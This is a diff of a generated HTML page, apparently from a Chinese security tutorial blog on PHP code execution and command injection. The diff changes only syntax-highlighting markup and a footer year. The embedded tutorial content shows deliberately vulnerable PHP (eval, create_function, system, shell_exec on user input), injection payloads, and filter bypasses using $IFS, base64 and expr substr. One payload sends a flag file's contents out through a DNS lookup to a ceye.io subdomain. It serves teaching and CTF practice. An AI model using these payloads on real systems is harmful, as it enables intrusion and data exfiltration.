@@ -190,12 +190,12 @@
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-	<span class="nx">hilight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-	<span class="nv">$a</span> <span class="o">=</span> <span class="s1">&#39;phpinfo();&#39;</span><span class="p">;</span>
-	<span class="k">eval</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
-<span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">hilight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$a</span> <span class="o">=</span> <span class="s1">&#39;phpinfo();&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">eval</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="112-assert">1.1.2 assert</h4>
 <p><img
@@ -294,14 +294,14 @@
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-	<span class="nx">hightlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-	<span class="nv">$price</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;price&#39;</span><span class="p">];</span>
-	<span class="nv">$code</span> <span class="o">=</span> <span class="s1">&#39;echo $name&#39;</span><span class="o">.</span> <span class="s1">&#39;的价格是&#39;</span><span class="o">.</span> <span class="nv">$price</span><span class="o">.</span> <span class="s1">&#39;;&#39;</span><span class="p">;</span>
-	<span class="nv">$b</span> <span class="o">=</span> <span class="nx">create_function</span><span class="p">(</span><span class="s1">&#39;$name&#39;</span><span class="p">,</span> <span class="nv">$code</span><span class="p">);</span>
-	<span class="nv">$b</span><span class="p">(</span><span class="s1">&#39;iPhone&#39;</span><span class="p">);</span>
-<span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">hightlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$price</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;price&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$code</span> <span class="o">=</span> <span class="s1">&#39;echo $name&#39;</span><span class="o">.</span> <span class="s1">&#39;的价格是&#39;</span><span class="o">.</span> <span class="nv">$price</span><span class="o">.</span> <span class="s1">&#39;;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$b</span> <span class="o">=</span> <span class="nx">create_function</span><span class="p">(</span><span class="s1">&#39;$name&#39;</span><span class="p">,</span> <span class="nv">$code</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$b</span><span class="p">(</span><span class="s1">&#39;iPhone&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>Payload：<code>url?price=123;}phpinfo();/*</code></p>
 <h2 id="2-命令注入">2 命令注入</h2>
@@ -372,12 +372,12 @@
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-<span class="nv">$rce</span> <span class="o">=</span> <span class="s2">&#34;echo 123&#34;</span><span class="p">;</span>
-<span class="nx">system</span><span class="p">(</span><span class="nv">$rce</span><span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
-<span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$rce</span> <span class="o">=</span> <span class="s2">&#34;echo 123&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">system</span><span class="p">(</span><span class="nv">$rce</span><span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>如何实现命令执行</p>
 <ul>
@@ -404,8 +404,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nv">$a</span><span class="o">=</span>l<span class="p">;</span><span class="nv">$b</span><span class="o">=</span>s<span class="p">;</span><span class="nv">$a$b</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span>l<span class="p">;</span><span class="nv">$b</span><span class="o">=</span>s<span class="p">;</span><span class="nv">$a$b</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h5 id="2232-base64-编码">2.2.3.2 base64 编码</h5>
 <div class="highlight"><div class="chroma">
@@ -413,8 +413,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="sb">`</span><span class="nb">echo</span> cHdk <span class="p">|</span> base64 -D<span class="sb">`</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="sb">`</span><span class="nb">echo</span> cHdk <span class="p">|</span> base64 -D<span class="sb">`</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h5 id="2233-substr-string-pos-len">2.2.3.3 substr string pos len</h5>
 <p>该表达式是从 string 中取出从 pos 位置开始长度为 len 的子字符串。如果 pos 或 len 为非正整数时，将返回空字符串。</p>
@@ -434,10 +434,10 @@
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s2">&#34;`expr\$IFS\substr\\</span><span class="nv">$IFS</span><span class="s2">\\</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span><span class="s2">\\</span><span class="nv">$IFS</span><span class="s2">\1\$IFS\1`&#34;</span>
-<span class="nb">echo</span> <span class="sb">`</span><span class="k">$(</span>expr<span class="si">${</span><span class="nv">IFS</span><span class="si">}</span>substr<span class="si">${</span><span class="nv">IFS</span><span class="si">}</span><span class="nv">$PWD</span><span class="si">${</span><span class="nv">IFS</span><span class="si">}</span>1<span class="si">${</span><span class="nv">IFS</span><span class="si">}</span>1<span class="k">)</span><span class="sb">`</span> -&gt; /
-expr<span class="si">${</span><span class="nv">IFS</span><span class="si">}</span>substr<span class="si">${</span><span class="nv">IFS</span><span class="si">}</span><span class="nv">$SESSION_MANAGER</span><span class="si">${</span><span class="nv">IFS</span><span class="si">}</span>6<span class="si">${</span><span class="nv">IFS</span><span class="si">}</span>1<span class="o">{</span><span class="nv">$IFS</span><span class="o">}</span><span class="m">1</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;`expr\$IFS\substr\\</span><span class="nv">$IFS</span><span class="s2">\\</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span><span class="s2">\\</span><span class="nv">$IFS</span><span class="s2">\1\$IFS\1`&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="sb">`</span><span class="k">$(</span>expr<span class="si">${</span><span class="nv">IFS</span><span class="si">}</span>substr<span class="si">${</span><span class="nv">IFS</span><span class="si">}</span><span class="nv">$PWD</span><span class="si">${</span><span class="nv">IFS</span><span class="si">}</span>1<span class="si">${</span><span class="nv">IFS</span><span class="si">}</span>1<span class="k">)</span><span class="sb">`</span> -&gt; /
+</span></span><span class="line"><span class="cl">expr<span class="si">${</span><span class="nv">IFS</span><span class="si">}</span>substr<span class="si">${</span><span class="nv">IFS</span><span class="si">}</span><span class="nv">$SESSION_MANAGER</span><span class="si">${</span><span class="nv">IFS</span><span class="si">}</span>6<span class="si">${</span><span class="nv">IFS</span><span class="si">}</span>1<span class="o">{</span><span class="nv">$IFS</span><span class="o">}</span><span class="m">1</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -480,15 +480,15 @@ expr<span class="si">${</span><span class="nv">IFS</span><span class="si">}</spa
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-<span class="k">include</span><span class="p">(</span><span class="s2">&#34;where_is_flag.php&#34;</span><span class="p">);</span>
-<span class="k">echo</span> <span class="s2">&#34;ping:&#34;</span><span class="p">;</span>
-<span class="nv">$ip</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ping&#39;</span><span class="p">];</span>
-<span class="nv">$ip</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;0.0&#34;</span><span class="p">,</span> <span class="nv">$ip</span><span class="p">);</span>
-<span class="nx">shell_exec</span><span class="p">(</span><span class="s2">&#34;ping &#34;</span><span class="o">.</span><span class="nv">$ip</span><span class="p">);</span>
-<span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;where_is_flag.php&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;ping:&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ip</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ping&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ip</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;0.0&#34;</span><span class="p">,</span> <span class="nv">$ip</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">shell_exec</span><span class="p">(</span><span class="s2">&#34;ping &#34;</span><span class="o">.</span><span class="nv">$ip</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>payload：</p>
 <div class="highlight"><div class="chroma">
@@ -497,9 +497,9 @@ expr<span class="si">${</span><span class="nv">IFS</span><span class="si">}</spa
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">ip=;cp where_is_flag.php 1.txt
-ip=`cat 1.txt|sed s/[[:space:]]//`.xx.ceye.io
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ip=;cp where_is_flag.php 1.txt
+</span></span><span class="line"><span class="cl">ip=`cat 1.txt|sed s/[[:space:]]//`.xx.ceye.io
+</span></span></code></pre></td></tr></table>
 </div>
 </div><div class="details admonition tip open">
         <div class="details-summary admonition-title">
@@ -537,7 +537,7 @@ ip=`cat 1.txt|sed s/[[:space:]]//`.xx.ceye.io
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
